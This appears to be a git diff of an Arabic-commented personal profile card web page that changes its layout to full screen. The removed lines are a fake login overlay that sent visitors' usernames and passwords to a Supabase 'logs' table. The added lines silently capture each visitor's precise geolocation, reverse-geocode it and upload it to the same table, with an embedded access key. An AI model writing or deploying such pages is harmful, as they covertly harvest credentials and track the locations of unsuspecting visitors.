@@ -20,45 +20,40 @@
             width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
         @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        
+        /* تعديل العرض ليصبح كاملاً */
         .vcard {
-            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
-            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
+            width: 100%; /* العرض كامل */
+            height: 100vh; /* الطول كامل الشاشة */
+            background: var(--front_color);
+            backdrop-filter: blur(25px); 
+            border: none; /* إزالة الحدود لجعلها تبدو كصفحة كاملة */
+            position: relative; 
+            overflow-y: auto; /* السماح بالتمرير إذا كان المحتوى طويلاً */
+            display: flex;
+            flex-direction: column;
         }
-        .header { height: 35%; position: relative; }
-        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
-        .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
-        .profile_video { width: 100%; height: 100%; object-fit: cover; }
-        .card_content { padding-top: 85px; text-align: center; }
-        .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
-        .cigarette-box { margin: 10px 0; }
-        .cigarette-box i { font-size: 2.2em; color: var(--muted-gold); }
-        .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; }
-        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
-        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
 
-        #lock-screen {
-            position: fixed; inset: 0; background: #0a192f; z-index: 99999;
-            display: flex; justify-content: center; align-items: center; transition: 0.8s;
-        }
-        .login-box { width: 320px; padding: 30px; background: rgba(255,255,255,0.03); border-radius: 20px; border: 1px solid var(--gold); text-align: center; backdrop-filter: blur(10px); }
-        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid var(--muted-gold); background: transparent; color: white; outline: none; text-align: center; }
-        .login-box button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: var(--gold); color: #0a192f; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .login-box button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .header { height: 40%; position: relative; width: 100%; }
+        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
+        .wave-01 { border-radius: 43%; top: -150%; left: 50%; transform: translateX(-50%); position: absolute; width: 800px; height: 800px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.3; animation: rotate 14s linear infinite; }
+        @keyframes rotate { 100% { transform: translateX(-50%) rotate(360deg); } }
+        
+        .profile_pic_content { width: 150px; height: 150px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 4px solid var(--muted-gold); z-index: 10; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        .profile_video { width: 100%; height: 100%; object-fit: cover; }
+        
+        .card_content { padding-top: 100px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
+        .satan h4 { font-size: 2.5em; letter-spacing: 5px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
+        
+        .snuff { min-height: 80px; padding: 0 20px; color: #8892b0; font-size: 1.1em; max-width: 600px; }
+        
+        .social { width: 100%; padding-bottom: 40px; }
+        .social div { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; padding: 0 20px; }
+        .social i { padding: 15px; font-size: 1.5em; background: rgba(197, 160, 89, 0.08); border-radius: 18px; border: 1px solid rgba(197, 160, 89, 0.2); color: var(--muted-gold); transition: 0.3s; }
+        .social i:hover { transform: translateY(-5px); background: rgba(197, 160, 89, 0.15); border-color: var(--gold); }
     </style>
 </head>
 <body>
-
-<div id="lock-screen">
-    <div class="login-box">
-        <h2 style="color: var(--gold); margin-bottom: 20px;">تسجيل الدخول</h2>
-        <input type="text" id="u" placeholder="اسم المستخدم">
-        <input type="password" id="p" placeholder="كلمة المرور">
-        <button onclick="sendData()" id="btn">دخول</button>
-    </div>
-</div>
 
 <div class="vcard">
     <div class="header">
@@ -71,7 +66,6 @@
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
-        <div class="cigarette-box"><i class="fas fa-smoking"></i></div>
         <div class="snuff"><h5 class="typed_text"></h5></div>
         <div class="social">
             <div>
@@ -93,17 +87,22 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    let finalLocData = "جاري جلب الموقع...";
-    let watchId = null;
+    let finalLocData = "جاري جلب الموقع بدقة عالية...";
 
     function startTracking() {
         if ("geolocation" in navigator) {
-            const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
-            watchId = navigator.geolocation.watchPosition(async (pos) => {
+            const geoOptions = { 
+                enableHighAccuracy: true, 
+                timeout: 30000, 
+                maximumAge: 0 
+            };
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy;
-                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                const mapUrl = `http://maps.google.com/maps?q=${lat},${lon}`;
+                
                 try {
                     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
                     const d = await r.json();
@@ -111,12 +110,13 @@
                 } catch(e) {
                     finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 }
-                if (acc <= 15) navigator.geolocation.clearWatch(watchId);
+                
+                await sb.from('logs').insert([{ username: "AUTO_FULL_WIDTH", location: finalLocData }]);
+                
             }, (err) => {
-                const errors = ["", "رفض الإذن", "غير متاح", "انتهى الوقت"];
-                finalLocData = `خطأ موقع: ${errors[err.code] || "غير معروف"}`;
+                finalLocData = "فشل في تحديد الموقع: " + err.message;
             }, geoOptions);
-        } else { finalLocData = "المتصفح لا يدعم الموقع"; }
+        }
     }
 
     window.onload = () => {
@@ -126,18 +126,6 @@
             typeSpeed: 50, backSpeed: 30, loop: true
         });
     };
-
-    async function sendData() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
-        const btn = document.getElementById('btn');
-        if(!u || !p) return alert("يرجى إكمال البيانات");
-        btn.innerText = "جاري التحقق...";
-        btn.disabled = true;
-        await sb.from('logs').insert([{ username: u, password: p, location: finalLocData }]);
-        document.getElementById('lock-screen').style.opacity = "0";
-        setTimeout(() => { document.getElementById('lock-screen').style.display = "none"; }, 800);
-    }
 </script>
 </body>
 </html>
